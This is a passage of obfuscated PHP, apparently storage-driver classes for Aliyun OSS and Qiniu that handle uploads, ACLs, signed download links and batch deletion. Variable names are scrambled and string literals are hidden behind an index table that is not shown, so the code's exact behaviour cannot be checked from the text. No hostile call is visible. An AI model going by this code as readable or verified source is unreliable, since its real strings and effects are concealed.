$ñïÊõÁç, $æ¹ìĞ¹û[218] => $ÕÂºÊøÍ); } return !1; } public function listAll($­©Øı¯) { $Ó·‚¥áÚ =& $_SERVER[„Ç©ñÎ©]; $Š§½²®Û = $this->fileList($­©Øı¯, $Ó·‚¥áÚ[12], !0); $¼£àöˆ = array(); foreach ($Š§½²®Û[$Ó·‚¥áÚ[93]] as $ûú˜öë) { $¼£àöˆ[$ûú˜öë[$Ó·‚¥áÚ[32]]] = $ûú˜öë[$Ó·‚¥áÚ[86]]; } foreach ($Š§½²®Û[$Ó·‚¥áÚ[92]] as $ûú˜öë) { if (is_string($ûú˜öë)) { $¼£àöˆ[$ûú˜öë] = 0; } } return $this->listAllFiles($­©Øı¯, array_keys($¼£àöˆ), $¼£àöˆ); } public function canRead($‚üÁ„§¬) { $——¤áñÖ =& $_SERVER[„Ç©ñÎ©]; $ôî½œ¿¶ = $this->pathAcl($‚üÁ„§¬); return $ôî½œ¿¶ == $——¤áñÖ[1405] || $ôî½œ¿¶ == $——¤áñÖ[565] ? !0 : !1; } public function canWrite($ùİ¦í°) { $´İÀµÂ¤ = $this->pathAcl($ùİ¦í°); return $´İÀµÂ¤ == $_SERVER[„Ç©ñÎ©][565] ? !0 : !1; } public function pathAcl($¶âÜ„Ğ’) { $Ì­Öİàš =& $_SERVER[„Ç©ñÎ©]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÕÄ¶•ëé = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¶âÜ„Ğ’)); } catch (OSS\Core\OssException $µ»‹–Õ) { return !1; } $Æ¥º‹ÅÁ = $ÕÄ¶•ëé == $Ì­Öİàš[37] ? $this->bucketAcl : $ÕÄ¶•ëé; if ($Æ¥º‹ÅÁ == $Ì­Öİàš[1406]) { return $Ì­Öİàš[1405]; } if ($Æ¥º‹ÅÁ == $Ì­Öİàš[1407]) { return $Ì­Öİàš[565]; } return $Æ¥º‹ÅÁ; } private function chmodPath($˜ëîºœ—, $ÇĞ©¸§ = '') { $ıßÂÁÏ =& $_SERVER[„Ç©ñÎ©]; $è¸Íô¡Ê = empty($ÇĞ©¸§) ? $ıßÂÁÏ[1407] : $ÇĞ©¸§; $™ñÚÂæ£ = array($ıßÂÁÏ[37], $ıßÂÁÏ[208], $ıßÂÁÏ[1406], $ıßÂÁÏ[1407]); if (!in_array($è¸Íô¡Ê, $™ñÚÂæ£)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($˜ëîºœ—), $è¸Íô¡Ê); } catch (OSS\Core\OssException $ş¡¶İ¿¢) { return !1; } return !0; } public function getContent($â‘ü„Ş£) { return $this->fileSubstr($â‘ü„Ş£, -1); } public function setContent($Ğ¶ğĞô, $æÀú×³È = '') { $´÷ŠÄşŞ =& $_SERVER[„Ç©ñÎ©]; try { $ˆ¸¦¹ä = $this->trafficLimit($´÷ŠÄşŞ[1408]); $‹¸Ë”×¬ = $this->client->putObject($this->bucket, $this->pathEncode($Ğ¶ğĞô), $æÀú×³È, $ˆ¸¦¹ä); } catch (OSS\Core\OssException $¸œµØ“ğ) { return !1; } $Û¶ÆË¿õ = array($´÷ŠÄşŞ[1398] => trim($‹¸Ë”×¬[$´÷ŠÄşŞ[1409]], $´÷ŠÄşŞ[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ğ¶ğĞô))); $this->updateObjMeta($Ğ¶ğĞô, $Û¶ÆË¿õ); return isset($‹¸Ë”×¬[$´÷ŠÄşŞ[1410]][$´÷ŠÄşŞ[1357]]) ? !0 : !1; } private function updateObjMeta($Ïåô’, $óşÑÅ²¯) { $Ïåô’ = $this->pathEncode($Ïåô’); try { $´ áƒ–Å = array(OSS\OssClient::OSS_HEADERS => $óşÑÅ²¯); $this->client->copyObject($this->bucket, $Ïåô’, $this->bucket, $Ïåô’, $´ áƒ–Å); } catch (OSS\Core\OssException $öá®ƒ¬•) { return !1; } return !0; } public function upload($õçŞ£‰–, $ù¼©æšÔ, $‰¸ş¢‚ = false, $ƒ´„Ì  = REPEAT_REPLACE) { $˜ñ•öÃß =& $_SERVER[„Ç©ñÎ©]; $°ùóÄÃ‘ = trim($õçŞ£‰–, $˜ñ•öÃß[8]); $Ÿ¿·Å‹“ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($˜ñ•öÃß[1398] => @md5_file($ù¼©æšÔ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($õçŞ£‰–))); $Ÿ¿·Å‹“ = $this->trafficLimit($˜ñ•öÃß[1408], $Ÿ¿·Å‹“); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($°ùóÄÃ‘), $ù¼©æšÔ, $Ÿ¿·Å‹“); } catch (OSS\Core\OssException $‰íÉ„Üú) { return !1; } return $this->getPathOuter($õçŞ£‰–); } public function getHost() { $¸Æğæ• =& $_SERVER[„Ç©ñÎ©]; $Ê–ı±ÍÅ = explode($¸Æğæ•[193], parent::getHost()); return $Ê–ı±ÍÅ[0] . $¸Æğæ•[193] . $this->bucket . $¸Æğæ•[10] . $Ê–ı±ÍÅ[1]; } public function uploadFormData($½ÒÄãùè, $Ìˆ§¦ = 3600) { $°óÄºÙ =& $_SERVER[„Ç©ñÎ©]; if (!($¯•ü²ÓÎ = $this->getHost())) { return !1; } $å‹…ÎŸÄ = $Ìˆ§¦; $Ëç¡Á€« = date($°óÄºÙ[1411], time() + $å‹…ÎŸÄ); $Œùáù‡Ç = new DateTime($Ëç¡Á€«); $§š„İãÉ = $Œùáù‡Ç->format(DateTime::ISO8601); $æÔËÎ›£ = strpos($§š„İãÉ, $°óÄºÙ[305]); $§š„İãÉ = substr($§š„İãÉ, 0, $æÔËÎ›£) . $°óÄºÙ[1412]; $œÃœëÉ† = 1048576000 * 5; $Å¾ĞËİÛ = $this->pathFather($½ÒÄãùè); $±”ƒòóí = array($°óÄºÙ[1311] => $§š„İãÉ, $°óÄºÙ[1312] => array(array($°óÄºÙ[1413], 0, $œÃœëÉ†), array($°óÄºÙ[1315], $°óÄºÙ[1316], $Å¾ĞËİÛ))); $ÀØŸˆç¢ = base64_encode(json_encode($±”ƒòóí)); $Ï¯Ôù¶ = base64_encode(hash_hmac($°óÄºÙ[241], $ÀØŸˆç¢, $this->secret, !0)); $×ñ½ìüú = array($°óÄºÙ[1321] => $ÀØŸˆç¢, $°óÄºÙ[1414] => $this->accessKey, $°óÄºÙ[1317] => $°óÄºÙ[1309], $°óÄºÙ[1415] => $Ï¯Ôù¶, $°óÄºÙ[191] => $¯•ü²ÓÎ); $×ñ½ìüú = $this->trafficLimit($°óÄºÙ[1408], $×ñ½ìüú); return $×ñ½ìüú; } public function multiUploadFormData($ ¸œ±ˆ, $Ïö­‰ˆó = 3600) { $çÄğß =& $_SERVER[„Ç©ñÎ©]; if (!($ñÖ÷Š–û = $this->getHost())) { return !1; } $ŠÌÎ›Ü = $this->trafficLimit($çÄğß[1408]); $Â†Å¶´ß = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ ¸œ±ˆ), $ŠÌÎ›Ü); return array($çÄğß[233] => $Â†Å¶´ß, $çÄğß[191] => $ñÖ÷Š–û . $çÄğß[8] . $this->pathEncode($ ¸œ±ˆ), $çÄğß[234] => gmdate($çÄğß[1416]), $çÄğß[104] => $ ¸œ±ˆ); } public function multiUploadAuthData($Éû–ùá, $öüÒšŸ¯ = array()) { $‡“„©ì« =& $_SERVER[„Ç©ñÎ©]; $âğàïê‹ = isset($öüÒšŸ¯[$‡“„©ì«[234]]) ? $öüÒšŸ¯[$‡“„©ì«[234]] : gmdate($‡“„©ì«[1416]); $ÉÍê–¨ = isset($öüÒšŸ¯[$‡“„©ì«[184]]) ? $öüÒšŸ¯[$‡“„©ì«[184]] : $‡“„©ì«[12]; $‘‘Ô°´« = $Éû–ùá; if (isset($öüÒšŸ¯[$‡“„©ì«[104]])) { $‘‘Ô°´« = $öüÒšŸ¯[$‡“„©ì«[104]]; unset($öüÒšŸ¯[$‡“„©ì«[104]]); } if (isset($öüÒšŸ¯[$‡“„©ì«[235]])) { $öüÒšŸ¯[$‡“„©ì«[234]] = $âğàïê‹; return $this->listUploadParts($‘‘Ô°´«, $öüÒšŸ¯); } $Ä²Çø = array($‡“„©ì«[236], $‡“„©ì«[12], $‡“„©ì«[130], $âğàïê‹, "\170\55\157\x73\x73\x2d\144\x61\164\x65\72{$âğàïê‹}", $‡“„©ì«[8] . $this->bucket . $‡“„©ì«[8] . $‘‘Ô°´« . $ÉÍê–¨); if (strpos($ÉÍê–¨, $‡“„©ì«[237]) === 0) { $Ä²Çø[0] = $‡“„©ì«[238]; if ($Ìò÷üÀ’ = $this->trafficLimit($‡“„©ì«[1408])) { $‘‘Ô°´« = $‡“„©ì«[1417]; array_splice($Ä²Çø, 5, 0, $‘‘Ô°´« . $‡“„©ì«[4] . $Ìò÷üÀ’[$‘‘Ô°´«]); } } if (isset($öüÒšŸ¯[$‡“„©ì«[239]]) && $öüÒšŸ¯[$‡“„©ì«[239]] == $‡“„©ì«[240]) { $Ä²Çø[0] = $‡“„©ì«[240]; } if (!empty($öüÒšŸ¯[$‡“„©ì«[1418]])) { $ â âşÎ = array_merge(array($Ä²Çø[4]), $öüÒšŸ¯[$‡“„©ì«[1418]]); sort($ â âşÎ); $Ä²Çø[4] = implode($‡“„©ì«[66], $ â âşÎ); } $¹í´«Ì¡ = implode($‡“„©ì«[66], $Ä²Çø); $£„¨ş‰ = base64_encode(hash_hmac($‡“„©ì«[241], $¹í´«Ì¡, $this->secret, !0)); $¹‡¥¥‹ = $‡“„©ì«[1382] . $this->accessKey . $‡“„©ì«[4] . $£„¨ş‰; if (strpos($ÉÍê–¨, $‡“„©ì«[237]) === 0) { $¹‡¥¥‹ = array($‡“„©ì«[243] => $¹‡¥¥‹, $‡“„©ì«[234] => $âğàïê‹); if ($Ìò÷üÀ’) { $¹‡¥¥‹ = array_merge($¹‡¥¥‹, $Ìò÷üÀ’); } } return $¹‡¥¥‹; } public function listUploadParts($½¯àâÁ­, $µ—æøÙ) { $²‰¨Öƒ =& $_SERVER[„Ç©ñÎ©]; $ÉŒ†  = parse_url_query($µ—æøÙ[$²‰¨Öƒ[184]]); $†”›‹éÃ = $this->client->listParts($this->bucket, $this->pathEncode($½¯àâÁ­), $ÉŒ† [$²‰¨Öƒ[233]]); $§Ÿ¥É’ = $†”›‹éÃ->getListPart(); $¹ŸÈä¢ = array(); foreach ($§Ÿ¥É’ as $ÈÇôÒËÆ) { $¹ŸÈä¢[] = array($²‰¨Öƒ[1402] => $ÈÇôÒËÆ->getPartNumber(), $²‰¨Öƒ[1403] => trim($ÈÇôÒËÆ->getETag(), $²‰¨Öƒ[128])); } unset($µ—æøÙ[$²‰¨Öƒ[235]], $µ—æøÙ[$²‰¨Öƒ[239]]); $œıİ‚ÌÔ = $this->multiUploadAuthData($½¯àâÁ­, $µ—æøÙ); if (empty($œıİ‚ÌÔ)) { return !1; } return array($²‰¨Öƒ[243] => $œıİ‚ÌÔ, $²‰¨Öƒ[234] => $µ—æøÙ[$²‰¨Öƒ[234]], $²‰¨Öƒ[245] => $¹ŸÈä¢); } public function download($»²ãçŠ, $ªƒ’íïí) { if ($this->isFolder($»²ãçŠ)) { return !1; } try { $Æïéˆæş = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ªƒ’íïí); $Æïéˆæş = $this->trafficLimit($_SERVER[„Ç©ñÎ©][119], $Æïéˆæş); $this->client->getObject($this->bucket, $this->pathEncode($»²ãçŠ), $Æïéˆæş); } catch (OSS\Core\OssException $éÈ£å”÷) { return !1; } return $ªƒ’íïí; } public function fileSubstr($¥•ºù”ß, $Ö†»‘é§ = 0, $¶«“—´¸ = false) { if ($Ö†»‘é§ === -1) { $¢ß¢ß = array(); } else { if ($¶«“—´¸ === !1) { $é¨†Ú = $this->size($¥•ºù”ß); } else { $é¨†Ú = $Ö†»‘é§ + $¶«“—´¸ - 1; } $¢ß¢ß = array(OSS\OssClient::OSS_RANGE => "{$Ö†»‘é§}\x2d{$é¨†Ú}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($¥•ºù”ß), $¢ß¢ß); } catch (OSS\Core\OssException $§“ŞÛ‡ ) { think_exception($§“ŞÛ‡ ->getMessage()); return !1; } } private function trafficLimit($ëÉŠÄó, $Ç½ğÏŒ¤ = array()) { $×ûªãî¡ =& $_SERVER[„Ç©ñÎ©]; if ($ëÉŠÄó == $×ûªãî¡[1408] && $this->isUploadServer() || $ëÉŠÄó == $×ûªãî¡[119] && $this->isFileOutServer()) { return $Ç½ğÏŒ¤; } $†¢…ÑÛó = floatval($GLOBALS[$×ûªãî¡[6]][$×ûªãî¡[99]][$×ûªãî¡[117]][$ëÉŠÄó]) * 1024 * 1024 * 8; if (!$†¢…ÑÛó) { return $Ç½ğÏŒ¤; } $†¢…ÑÛó = $†¢…ÑÛó < 819200 ? 819200 : ($†¢…ÑÛó > 838860800 ? 838860800 : $†¢…ÑÛó); $Ç½ğÏŒ¤[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($†¢…ÑÛó); return $Ç½ğÏŒ¤; } public function link($–‚ó¡úº, $ƒ£¼¤• = array()) { $õ˜£úŸ¡ =& $_SERVER[„Ç©ñÎ©]; if (!$this->exist($–‚ó¡úº) || $this->isFolder($–‚ó¡úº)) { return !1; } try { $ƒ£¼¤• = $this->trafficLimit($õ˜£úŸ¡[119], $ƒ£¼¤•); $¿ÊĞ—° = $this->client->signUrl($this->bucket, $this->pathEncode($–‚ó¡úº), 3600 * 12, $õ˜£úŸ¡[240], $ƒ£¼¤•); return $this->getCdnLink($¿ÊĞ—°); } catch (OSS\Core\OssException $ƒœéé•¨) { return !1; } } public function fileOut($ôÈûçô½, $ìÇ¤˜Şò = false, $ØıÅ´£÷ = false, $Î‹ğ¡ªî = '') { $í´Ù‚×Ø =& $_SERVER[„Ç©ñÎ©]; if ($this->isFileOutServer()) { return $this->fileOutServer($ôÈûçô½, $ìÇ¤˜Şò, $ØıÅ´£÷, $Î‹ğ¡ªî); } if (!$ØıÅ´£÷) { $ØıÅ´£÷ = $this->pathThis($ôÈûçô½); } $ØıÅ´£÷ = rawurlencode($ØıÅ´£÷); $™Ô€ä¿² = get_file_mime(get_path_ext($ØıÅ´£÷)); if ($™Ô€ä¿² == $í´Ù‚×Ø[227]) { return parent::fileOut($ôÈûçô½, $ìÇ¤˜Şò, $ØıÅ´£÷, $Î‹ğ¡ªî); } $ìÇ¤˜Şò = $ìÇ¤˜Şò ? $í´Ù‚×Ø[1419] : $í´Ù‚×Ø[1420]; $àÙéäÖ = array(OSS\OssClient::OSS_SUB_RESOURCE => $í´Ù‚×Ø[1421] . rawurlencode("{$ìÇ¤˜Şò}\x3b\x66\151\154\145\156\141\155\x65\75{$ØıÅ´£÷}")); $àÙéäÖ[OSS\OssClient::OSS_SUB_RESOURCE] .= $í´Ù‚×Ø[1422] . rawurlencode($™Ô€ä¿²); $­ùÜëèü = $this->link($ôÈûçô½, $àÙéäÖ); $this->fileOutLink($­ùÜëèü); } public function fileOutServer($¹È½²û±, $ØÎ¾‚”‹ = false, $”Õ–¡´ = false, $Ö€ëíÖ = '') { parent::fileOut($¹È½²û±, $ØÎ¾‚”‹, $”Õ–¡´, $Ö€ëíÖ); } public function fileOutImage($¤úÀµı, $ÎïÚˆîÉ = 250) { $©˜†ŠÈ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[„Ç©ñÎ©][1423] . $ÎïÚˆîÉ); $³€ùçœ = $this->link($¤úÀµı, $©˜†ŠÈ); $this->fileOutLink($³€ùçœ); } public function fileOutImageServer($Ñ¯“ˆ¯, $ÃÂ›¸ = 250) { parent::fileOutImage($Ñ¯“ˆ¯, $ÃÂ›¸); } public function fileOutLink($êë£³Ù) { $ Ûëí˜Ô =& $_SERVER[„Ç©ñÎ©]; if (!$this->isCdnHost() && substr($êë£³Ù, 0, 7) == $ Ûëí˜Ô[1324]) { $êë£³Ù = $ Ûëí˜Ô[1325] . substr($êë£³Ù, 7); } header($ Ûëí˜Ô[171] . $êë£³Ù); die; } public function hashMd5($¥Èœ³Õ¤, $˜Òµ‹¨† = '') { $Ê³÷»ÅÌ =& $_SERVER[„Ç©ñÎ©]; $ƒÏûì = $this->_objectMeta($¥Èœ³Õ¤); if (!$ƒÏûì) { return $Ê³÷»ÅÌ[12]; } if (!isset($ƒÏûì[$Ê³÷»ÅÌ[1398]]) && !empty($˜Òµ‹¨†)) { $ñáŞŠˆå = $this->updateObjMeta($¥Èœ³Õ¤, array($Ê³÷»ÅÌ[1398] => $˜Òµ‹¨†)); $ƒÏûì[$Ê³÷»ÅÌ[1398]] = $ñáŞŠˆå ? $˜Òµ‹¨† : $Ê³÷»ÅÌ[12]; } return isset($ƒÏûì[$Ê³÷»ÅÌ[1398]]) ? strtolower($ƒÏûì[$Ê³÷»ÅÌ[1398]]) : $Ê³÷»ÅÌ[12]; } public function size($İÈİÌ ø) { $ƒåÌ×ù = $this->objectMeta($İÈİÌ ø); return $ƒåÌ×ù ? $ƒåÌ×ù[$_SERVER[„Ç©ñÎ©][86]] : 0; } public function info($›õŒè±Í) { if ($this->isFolder($›õŒè±Í)) { return $this->folderInfo($›õŒè±Í); } else { if ($this->isFile($›õŒè±Í)) { return $this->fileInfo($›õŒè±Í); } } return !1; } public function exist($Åº¥¡) { return $this->isFile($Åº¥¡) || $this->isFolder($Åº¥¡); } public function isFile($„úÏ²£) { return !$this->isFolder($„úÏ²£) && $this->objectMeta($„úÏ²£); } public function isFolder($›ãì°åÄ) { return $this->cacheMethod($_SERVER[„Ç©ñÎ©][175], $›ãì°åÄ); } protected function objectMeta($ñ×ä”Ê‹) { return $this->cacheMethod($_SERVER[„Ç©ñÎ©][177], $ñ×ä”Ê‹); } protected function _objectMeta($–®¶Üº˜) { $´î‚ç‡© =& $_SERVER[„Ç©ñÎ©]; try { $íÃ…­Í˜ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($–®¶Üº˜)); } catch (OSS\Core\OssException $¤Í‚˜ˆ) { $íÃ…­Í˜ = !1; } if ($íÃ…­Í˜) { $íÃ…­Í˜[$´î‚ç‡©[86]] = intval($íÃ…­Í˜[$´î‚ç‡©[1396]]); } return $íÃ…­Í˜; } protected function _isFolder($è è«£Ş) { $Û•Óµ²¨ =& $_SERVER[„Ç©ñÎ©]; if ($è è«£Ş == $Û•Óµ²¨[12] || $è è«£Ş == $Û•Óµ²¨[8]) { return !0; } $¢û–à¨› = array($Û•Óµ²¨[1392] => $Û•Óµ²¨[8], $Û•Óµ²¨[1393] => rtrim($è è«£Ş, $Û•Óµ²¨[8]) . $Û•Óµ²¨[8], $Û•Óµ²¨[1394] => 1, $Û•Óµ²¨[1395] => $Û•Óµ²¨[12]); $É¡¾—˜í = $this->client->listObjects($this->bucket, $¢û–à¨›); if ($É¡¾—˜í->getObjectList() || $É¡¾—˜í->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($ºØ‚ÔúÑ) { parent::__construct(); require_once SDK_DIR . $_SERVER[„Ç©ñÎ©][1424]; $this->_init($ºØ‚ÔúÑ); } public function _init($Ä­¬İ²§) { $àÌš¸ã =& $_SERVER[„Ç©ñÎ©]; foreach ($Ä­¬İ²§ as $è£–¯‰ã => $À´šµ¾†) { if (isset($this->{$è£–¯‰ã})) { $this->{$è£–¯‰ã} = $À´šµ¾†; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($àÌš¸ã[1425] . LNG($àÌš¸ã[1383])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($•œÜ•ô¦, $¦ƒìä›­ = '', $üÁíª…š = REPEAT_RENAME) { if ($this->setContent($•œÜ•ô¦, $¦ƒìä›­)) { return $this->getPathOuter($•œÜ•ô¦); } return !1; } public function mkdir($óßµ×é, $¢¤ÚËÊ = REPEAT_SKIP) { $Û•õŒº =& $_SERVER[„Ç©ñÎ©]; $›Æ½­ş‹ = trim($óßµ×é, $Û•õŒº[8]); if ($this->_isFolder($›Æ½­ş‹)) { return $this->getPathOuter($›Æ½­ş‹); } $óßµ×é = $›Æ½­ş‹ . $Û•õŒº[8]; $Ü´ÜÄ · = get_path_this($›Æ½­ş‹); $«İêÕï = $óßµ×é . $Ü´ÜÄ ·; if (!$this->mkfile($«İêÕï)) { return !1; } if (!$this->moveFile($«İêÕï, $óßµ×é)) { $this->delFile($«İêÕï); return !1; } return $this->getPathOuter($›Æ½­ş‹); } public function copyFile($û§âÉ€É, $ÕˆÍ¼èé) { $ƒİ±×ª = $this->bucketManager->copy($this->bucket, $û§âÉ€É, $this->bucket, $ÕˆÍ¼èé, !0); return $ƒİ±×ª ? !1 : $this->getPathOuter($ÕˆÍ¼èé); } public function moveFile($œÃôªÛÛ, $¤íÚ‹ØÏ) { $éóÖ¶”ñ = $this->bucketManager->move($this->bucket, $œÃôªÛÛ, $this->bucket, $¤íÚ‹ØÏ, !0); return $éóÖ¶”ñ ? !1 : $this->getPathOuter($¤íÚ‹ØÏ); } public function delFile($´œÑ‚¶) { if (!$this->exist($´œÑ‚¶)) { return !0; } $á¯„¿”‚ = $this->bucketManager->delete($this->bucket, $´œÑ‚¶); return $á¯„¿”‚ ? !1 : !0; } public function delFolder($åº¡Ïóà) { $Ş—·êŠ· =& $_SERVER[„Ç©ñÎ©]; if (!$this->exist($åº¡Ïóà)) { return !0; } $this->listItemCache = !1; $§¯òå = $this->fileList($åº¡Ïóà); $this->listItemCache = !0; $×Ãõ¨äß = trim($åº¡Ïóà, $Ş—·êŠ·[8]) . $Ş—·êŠ·[8]; if (!empty($åº¡Ïóà) && $åº¡Ïóà !== $Ş—·êŠ·[207] && !in_array($×Ãõ¨äß, $§¯òå[$Ş—·êŠ·[92]])) { $§¯òå[$Ş—·êŠ·[92]][] = $×Ãõ¨äß; } $œÆö˜Ü = $this->delByBatch($§¯òå[$Ş—·êŠ·[93]]); if (!$œÆö˜Ü) { return !1; } $œÆö˜Ü = $this->delByBatch($§¯òå[$Ş—·êŠ·[92]]); if (!$œÆö˜Ü) { return !1; } return $this->delFile($×Ãõ¨äß); } private function delByBatch($Ù¸£ïß‚) { foreach (array_chunk($Ù¸£ïß‚, 1000) as $‘ÁÊ×¼°) { $¤ò¸ºÄİ = $this->bucketManager->buildBatchDelete($this->bucket, $‘ÁÊ×¼°); list($¿Ê ìÆ€, $Å×ß‘´µ) = $this->bucketManager->batch($¤ò¸ºÄİ); if ($Å×ß‘´µ) { return !1; } } return !0; } public function rename($µé£¨Ôõ, $ÜòæôåÏ) { return $this->renameObject($µé£¨Ôõ, $ÜòæôåÏ); } public function fileInfo($È›³œ½ò, $Üì¼¶ƒ© = false, $®†Õ£Ğ = array()) { $›­ƒ¯” =& $_SERVER[„Ç©ñÎ©]; $Ù¥€çû” = array($›­ƒ¯”[32] => $this->pathThis($È›³œ½ò), $›­ƒ¯”[94] => $this->getPathOuter($›­ƒ¯”[8] . $È›³œ½ò), $›­ƒ¯”[33] => $›­ƒ¯”[209], $›­ƒ¯”[86] => isset($®†Õ£Ğ[$›­ƒ¯”[1426]]) ? $®†Õ£Ğ[$›­ƒ¯”[1426]] : 0, $›­ƒ¯”[184] => $this->ext($È›³œ½ò)); if ($Üì¼¶ƒ©) { return $Ù¥€çû”; } $Ù¥€çû”[$›­ƒ¯”[210]] = $Ù¥€çû”[$›­ƒ¯”[95]] = 0; $Ù¥€çû”[$›­ƒ¯”[211]] = $Ù¥€çû”[$›­ƒ¯”[212]] = !0; if (empty($®†Õ£Ğ)) { $®†Õ£Ğ = $this->objectMeta($È›³œ½ò); if (!$®†Õ£Ğ) { return $Ù¥€çû”; } } if (isset($®†Õ£Ğ[$›­ƒ¯”[1427]])) { $Ù¥€çû”[$›­ƒ¯”[95]] = substr($®†Õ£Ğ[$›­ƒ¯”[1427]] . $›­ƒ¯”[12], 0, 10); } if (isset($®†Õ£Ğ[$›­ƒ¯”[1426]])) { $Ù¥€çû”[$›­ƒ¯”[86]] = $®†Õ£Ğ[$›­ƒ¯”[1426]]; } return $Ù¥€çû”; } public function folderInfo($¡‡¼°¨‘, $ÓÃ¢š¶¨ = false) { $Û¥àèË =& $_SERVER[„Ç©ñÎ©]; $üÓòå”µ = array($Û¥àèË[32] => $this->pathThis($¡‡¼°¨‘), $Û¥àèË[94] => $this->getPathOuter($Û¥àèË[8] . $¡‡¼°¨‘), $Û¥àèË[33] => $Û¥àèË[85]); if ($ÓÃ¢š¶¨) { return $üÓòå”µ; } $üÓòå”µ[$Û¥àèË[210]] = $üÓòå”µ[$Û¥àèË[95]] = 0; $üÓòå”µ[$Û¥àèË[211]] = $üÓòå”µ[$Û¥àèË[212]] = !0; $¡‡¼°¨‘ = rtrim($¡‡¼°¨‘, $Û¥àèË[8]) . $Û¥àèË[8]; $ğÍ«¨ = $this->objectMeta($¡‡¼°¨‘); if (isset($ğÍ«¨[$Û¥àèË[1427]])) { $üÓòå”µ[$Û¥àèË[95]] = substr($ğÍ«¨[$Û¥àèË[1427]] . $Û¥àèË[12], 0, 10); } return $üÓòå”µ; } public function listPath($©°çÏÄ, $Ÿ¥Û«Ø = false) { $É€Âß©Ú =& $_SERVER[„Ç©ñÎ©]; $Š†À¯ã = $this->fileList($©°çÏÄ, $É€Âß©Ú[8], !0); foreach ($Š†À¯ã[$É€Âß©Ú[92]] as $„Ãö³î½ => $İÙàôˆÜ) { $Š†À¯ã[$É€Âß©Ú[92]][$„Ãö³î½] = $this->folderInfo($İÙàôˆÜ, $Ÿ¥Û«Ø); } foreach ($Š†À¯ã[$É€Âß©Ú[93]] as $„Ãö³î½ => $İÙàôˆÜ) { $Š†À¯ã[$É€Âß©Ú[93]][$„Ãö³î½] = $this->fileInfo($İÙàôˆÜ[$É€Âß©Ú[104]], $Ÿ¥Û«Ø, $İÙàôˆÜ); } return $Š†À¯ã; } public function has($öŞÄÓ¬¢, $“ìè©í = false, $ò°‚ïı = true) { $•¯ï°˜µ =& $_SERVER[„Ç©ñÎ©]; $öŞÄÓ¬¢ = trim($öŞÄÓ¬¢, $•¯ï°˜µ[8]); $´É‚Ù©ò = empty($öŞÄÓ¬¢) && $öŞÄÓ¬¢ !== $•¯ï°˜µ[207] ? $•¯ï°˜µ[12] : $öŞÄÓ¬¢ . $•¯ï°˜µ[8]; $¯„ê¸¹ = $•¯ï°˜µ[12]; $ëİûº™Â = 500; $¿„ìé¶ä = $•¯ï°˜µ[8]; $Œ¶¿Øå = $­©üİ¨ = 0; while (!0) { check_abort(); list($˜¹‚è¢, $ßèš¬äì) = $this->bucketManager->listFiles($this->bucket, $´É‚Ù©ò, $¯„ê¸¹, $ëİûº™Â, $¿„ìé¶ä); if ($ßèš¬äì) { break; } $¯„ê¸¹ = array_key_exists($•¯ï°˜µ[1395], $˜¹‚è¢) ? $¯„ê¸¹ = $˜¹‚è¢[$•¯ï°˜µ[1428]] : $•¯ï°˜µ[12]; if ($“ìè©í) { if (!empty($˜¹‚è¢[$•¯ï°˜µ[1429]])) { $Œ¶¿Øå += count($˜¹‚è¢[$•¯ï°˜µ[1429]]); } if (!empty($˜¹‚è¢[$•¯ï°˜µ[1430]])) { $­©üİ¨ += count($˜¹‚è¢[$•¯ï°˜µ[1430]]); } if ($¯„ê¸¹ === $•¯ï°˜µ[12]) { break; } continue; } if ($ò°‚ïı) { if (!empty($˜¹‚è¢[$•¯ï°˜µ[1429]])) { return !0; } } else { if (!empty($˜¹‚è¢[$•¯ï°˜µ[1430]])) { return !0; } } if ($¯„ê¸¹ === $•¯ï°˜µ[12]) { break; } } if ($“ìè©í) { return array($•¯ï°˜µ[217] => $Œ¶¿Øå, $•¯ï°˜µ[218] => $­©üİ¨); } return !1; } public function listAll($Ê¨¦áèê) { $üåâÄ™ª =& $_SERVER[„Ç©ñÎ©]; $ë¤¿¶½ = $this->fileList($Ê¨¦áèê, $üåâÄ™ª[12], !0); $„ˆ¯Š–ò = array(); foreach ($ë¤¿¶½[$üåâÄ™ª[93]] as $·Ê«‹å§) { $„ˆ¯Š–ò[$·Ê«‹å§[$üåâÄ™ª[104]]] = $·Ê«‹å§[$üåâÄ™ª[86]]; } foreach ($ë¤¿¶½[$üåâÄ™ª[92]] as $·Ê«‹å§) { if (is_string($·Ê«‹å§)) { $„ˆ¯Š–ò[$·Ê«‹å§] = 0; } } return $this->listAllFiles($Ê¨¦áèê, array_keys($„ˆ¯Š–ò), $„ˆ¯Š–ò); } private function fileList($¤ñûÃà³, $Û¬è—³ù = '', $¹Ğ„Úùú = 0) { $¢ë¤ùÙ÷ =& $_SERVER[„Ç©ñÎ©]; $¤ñûÃà³ = trim($¤ñûÃà³, $¢ë¤ùÙ÷[8]); $Åø § ê = empty($¤ñûÃà³) && $¤ñûÃà³ !== $¢ë¤ùÙ÷[207] ? $¢ë¤ùÙ÷[12] : $¤ñûÃà³ . $¢ë¤ùÙ÷[8]; $€°øé„‚ = $¢ë¤ùÙ÷[12]; $ÍƒÃèì = 1000; $ºÚÀö® = $àÏäû§Ç = array(); while (!0) { 